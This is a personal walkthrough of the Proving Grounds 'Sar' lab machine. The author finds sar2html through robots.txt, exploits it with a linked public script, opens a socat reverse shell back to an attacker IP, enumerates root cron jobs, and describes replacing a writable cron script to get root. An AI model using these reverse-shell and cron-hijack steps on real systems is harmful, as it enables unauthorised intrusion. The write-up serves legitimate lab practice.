# PG Play - Sar
## Author: Love Sharma
## Released on: Jul 20, 2020
### Difficulty: Easy
### Community Difficulty: Easy
### Description: This is not a conventional foothold-privesc type of machine. Only proof.txt is a valid flag.
| Step: | Notes: |
| --- | --- |
| 1. | I ran a all ports nmap scan without a T4 switch to get started and ran another in parallel for speed with a T4 switch and of only common ports. |
| 2. | My fast NMAP scan found port 80 opened out of habit I manually checked for common files in the web directory, and found sar2html in robots.txt. |
| 3. | I found an exploit for sar2html which I figured I'd test out real quick. https://github.com/AssassinUKG/sar2HTML&ved=2ahUKEwi64tH145iFAxWepVYBHRJtC3gQFnoECAsQAQ&usg=AOvVaw09b6JcvNV9blzX1NKL5321 |
| 4. | This gave me a foothold with a dumb shell as the www user, I now needed to spawn a tty shell. |
| 5. | I tested a few different types of tty shell spawns, php, python, nc (no -e because of version issue but the nc tty without a -e didn't work either) the one that worked was a socat used below commands |
| 5.1 | On my attack box ```socat file:`tty`,raw,echo=0 tcp-listen:4444``` |
| 5.2 | On the target ```socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.175:4444``` | 
| 6. | I'd transferred linpeas over earlier with the dumb shell but made it a priority to get a tty first. I found that I had access to the /var/spool/cron/crontabs folder which included cron jobs for the root user. I discovered that a script called finally.sh ran on every 5th minute as a cron job this file was only executable and readable by me. |




echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin


/usr/sbin

Didn't have a tty shell so found a 
Tested a few different types, php, python, nc (no -e because of version issue but the nc tty without a -e didn't work either) the one that worked was a socat used below commands


On Kali (listen):

1
socat file:`tty`,raw,echo=0 tcp-listen:4444
On Victim (launch):

1
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.175:4444

socat once I used the sarhtml exploit to get a dumb shell to convert to a tty



Found with linpeas that I was able to view the crontabs file (/var/spool/cron/crontabs) could have found it with a command after picture though also quicker


cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"


Found that the finally script ran as root from the cron job and all it did was execute the write.sh which I was able to modify, found it horrendous trying to modify in the slow tty shell so I created a new one and tested all the same reverse shells like a dummy that didn't work earlier and realised socat should work since it worked earlier and moved it over with a http server and wget in between the cron jobs and listened on the port 1337 with the same socat listener command used earlier to get a tty shell









